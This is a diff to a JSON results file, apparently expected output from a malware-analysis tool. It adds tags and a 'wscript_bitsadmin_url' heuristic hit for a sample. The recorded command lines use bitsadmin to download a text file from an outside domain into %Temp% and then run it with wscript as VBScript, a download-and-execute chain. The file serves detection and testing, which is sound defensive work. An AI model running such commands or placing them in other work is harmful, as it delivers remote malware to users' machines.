@@ -224,6 +224,14 @@
           }
         },
         "tags": {
+          "dynamic": {
+            "process": {
+              "command_line": [
+                "bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB",
+                "wscript //E:VBScript %Temp%VB"
+              ]
+            }
+          },
           "network": {
             "dynamic": {
               "domain": [
@@ -308,6 +316,20 @@
           "heur_id": null,
           "signatures": [],
           "value": "bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_bitsadmin_url"
+          ],
+          "value": "bitsadmin /transfer 8 \"https://skynetx.com.br/info2.txt\" %Temp%VB"
+        },
+        {
+          "heur_id": 13,
+          "signatures": [
+            "wscript_bitsadmin_url"
+          ],
+          "value": "wscript //E:VBScript %Temp%VB"
         }
       ],
       "network.dynamic.domain": [
